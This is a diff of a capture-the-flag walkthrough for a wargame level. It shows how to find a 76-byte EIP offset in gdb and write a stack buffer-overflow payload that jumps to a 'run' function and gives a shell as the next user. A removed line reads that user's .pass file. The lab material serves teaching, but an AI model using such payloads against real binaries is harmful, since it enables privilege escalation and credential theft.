@@ -83,79 +83,45 @@ We need to force the call to the "run" function
 
 **********************************
 
-Check the exact buffer size with a pattern from wiremask.eu/tools/buffer-overflow-pattern-generator
+Get the EIP offset. First, with the size of the buffer : 80
 
-	(gdb) run
-	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	$ python -c 'print "B"*80' > /tmp/payload
+
+	$(gdb) r < /tmp/payload
+	Starting program: /home/user/level1/level1 < /tmp/payload
 
 	Program received signal SIGSEGV, Segmentation fault.
-	0x63413563 in ?? ()
+	0x42424242 in ?? ()
 
-	(gdb) print $eip
-	$1 = (void (*)()) 0x63413563
+EIP is overwritten, good. Remove 4 bytes to check if EIP start at 76
 
-Put the content of EIP in the checker of the tool and get the offset : 76
+	$ python -c 'print "B"*76' > /tmp/payload
 
-The exact buffer size is 76
+	$(gdb) r < /tmp/payload
+	Starting program: /home/user/level1/level1 < /tmp/payload
 
-Using the gdb-peda pattern tool
+	Program received signal SIGILL, Illegal instruction.
+	0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
 
-	(gdb-peda)$ pattern create 200 pattern_file
-
-	(gdb-peda)$ run < pattern_file
-	Program received signal SIGSEGV, Segmentation fault.
-	...
-	EIP: 0x41344141 ('AA4A')
-	...
-
-	(gdb-peda)$ pattern search
-	Registers contain pattern buffer:
-	...
-	EIP+0 found at offset: 76
-	....
-
-The buffer size is 76
+It's good
 
 **********************************
 
-Test it
-
-	$ python -c "print 'a'*77" | ./level1
-	Segmentation fault (core dumped)
-
-Open with gdb-peda and put 80 bytes of 'a' (76 + 4 for overwrite EIP)
-
-	$ python -c 'print "a"*80' > payload
-	(gdb-peda)$ run < payload
-	...
-	EIP: 0x61616161 ('aaaa')
-	...
-
-Good, the last 4 bytes will be the address of the function "run" for calling it instead of return address
+The last 4 bytes of the payload will be the address of the function "run" for calling it instead of EIP
 
 The address of the "run" function is "0x08048444" has seen above
 
 Beware of the little endian
 
-	$ python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/payload
+	$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
 
-Now execute with our payload
+Now execute with our payload and keep stdin open with `cat`
 
-	$ cat /tmp/payload | ./level1
+	$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
+	$ cat /tmp/payload - | ./level1
 	Good... Wait what?
-	Segfault
-
-The function "run" was executed but stdin is not open, we need to do it in one line
-
-	$ (cat /tmp/payload ; echo whoami) | ./level1
-	level1
-	Good... Wait what?
+	whoami
 	level2
-	Segmentation fault (core dumped)
-
-Ok it's works
-
-$ (cat /tmp/payload ; cat /home/user/level2/.pass) | ./level1
 
 Done!
 
